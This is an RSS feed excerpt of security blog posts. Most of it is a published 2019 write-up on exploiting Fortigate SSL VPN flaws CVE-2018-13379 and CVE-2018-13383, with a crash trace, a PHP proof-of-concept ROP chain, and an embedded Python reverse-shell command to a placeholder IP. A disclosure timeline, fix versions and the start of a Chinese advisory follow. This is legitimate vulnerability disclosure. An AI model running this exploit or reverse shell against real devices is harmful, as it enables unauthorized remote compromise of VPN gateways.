&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The buffer size is fixed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.
To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13381&quot;&gt;CVE-2018-13381&lt;/h3&gt;
&lt;p&gt;Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability ‚Äì It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Single thread, single process, single allocator
  The web daemon handles multiple connection with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;epoll()&lt;/code&gt;, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.&lt;/li&gt;
  &lt;li&gt;Operations regularly triggered
  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.&lt;/li&gt;
  &lt;li&gt;Apache additional memory management. 
  The memory won‚Äôt be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.&lt;/li&gt;
  &lt;li&gt;JeMalloc
  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379--cve-2018-13383&quot;&gt;CVE-2018-13379 + CVE-2018-13383&lt;/h3&gt;
&lt;p&gt;This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Gain authentication
  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Get the shell
  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.&lt;/p&gt;

    &lt;p&gt;Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something &lt;strong&gt;regularly&lt;/strong&gt; appears! It would be great if it is &lt;strong&gt;everywhere&lt;/strong&gt;, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time ‚Ä¶ and we started to fuzz the server, trying to get something useful.&lt;/p&gt;

    &lt;p&gt;We got an interesting crash. To our great surprise, we almost control the program counter!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here is the crash, and that‚Äôs why we love fuzzing! ;)&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Program received signal SIGSEGV, Segmentation fault.
  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
  2: /x $rax = 0x41414141
  1: x/i $pc
  =&amp;gt; 0x7fb908d12a77 &amp;lt;SSL_do_handshake+23&amp;gt;: callq *0x60(%rax)
  (gdb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;The crash happened in &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_do_handshake()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SSL_do_handshake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl_renegotiate_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL_in_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_in_before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_MODE_ASYNC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ASYNC_get_current_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_async_args&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_start_async_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_do_handshake_intern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handshake_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;We overwrote the function table inside &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt;&lt;/a&gt; called &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087&quot;&gt;method&lt;/a&gt;, so when the program trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s-&amp;gt;method-&amp;gt;ssl_renegotiate_check(s, 0);&lt;/code&gt;, it crashed.&lt;/p&gt;

    &lt;p&gt;This is actually an ideal target of our exploit! The allocation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt; can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret = s-&amp;gt;handshake_func(s);&lt;/code&gt; calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.&lt;/p&gt;

    &lt;p&gt;We first &lt;strong&gt;spray&lt;/strong&gt; the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here we put our php PoC on an HTTP server:&lt;/p&gt;
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;II&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32FC078&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110FA1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110fa15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1bed1f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop rax ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x04410f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// add rdi, rax ; mov eax, dword [rdi] ; ret  ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1366639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call system ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;python -c &apos;import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);&apos; xx.xxx.xx.xx /bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;AAAAAAAA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// offset&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:void(0);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;The PoC can be divided into three parts.&lt;/p&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Fake SSL structure
 The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt; to a place containing a void function pointer. The parameter at this time is SSL structure itself &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;. However, there is only 8 bytes ahead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;. We cannot simply call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt; on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:&lt;/p&gt;

        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;So we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handshake_func&lt;/code&gt; to this gadget, move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to our SSL structure, and do further ROP attack.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;ROP chain
 The ROP chain here is simple. We slightly move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; forward so there is enough space for our reverse shell command.&lt;/li&gt;
      &lt;li&gt;Overflow string
 Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_do_handshake&lt;/code&gt;. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;demo&quot;&gt;Demo&lt;/h1&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Aw55HqZW4x0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;11 December, 2018 Reported to Fortinet&lt;/li&gt;
  &lt;li&gt;19 March, 2019 All fix scheduled&lt;/li&gt;
  &lt;li&gt;24 May, 2019 All advisory released&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
&lt;p&gt;Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</link>
                <guid>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Fortigate SSL VPN Ë≥áÂÆâÈÄöÂ†±</title>
                <description>&lt;h3 id=&quot;ÂÖßÂÆπ&quot;&gt;ÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;‰∏ä‰∏ÄÁØá SSL VPN Á†îÁ©∂Á≥ªÂàóÊñáÊàëÂÄëÈÄöÂ†±‰∫ÜÂú® &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect ‰∏äÁöÑ RCE Âº±Èªû&lt;/a&gt;ÔºåÈÄô‰∏ÄÁØáÂ∞áÂÖ¨ÈñãÊàëÂÄëÂú® Fortigate SSL VPN ‰∏äÁöÑÁ†îÁ©∂ÔºåÂÖ±Ë®àÊâæÂà∞‰∏ãÂàó‰∫îÂÄãÂº±ÈªûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2018-13379: Pre-auth arbitrary file reading&lt;/li&gt;
  &lt;li&gt;CVE-2018-13380: Pre-auth XSS&lt;/li&gt;
  &lt;li&gt;CVE-2018-13381: Pre-auth heap overflow&lt;/li&gt;
  &lt;li&gt;CVE-2018-13382: The magic backdoor&lt;/li&gt;
  &lt;li&gt;CVE-2018-13383: Post-auth heap overflow&lt;/li&gt;
&lt;/ul&gt;

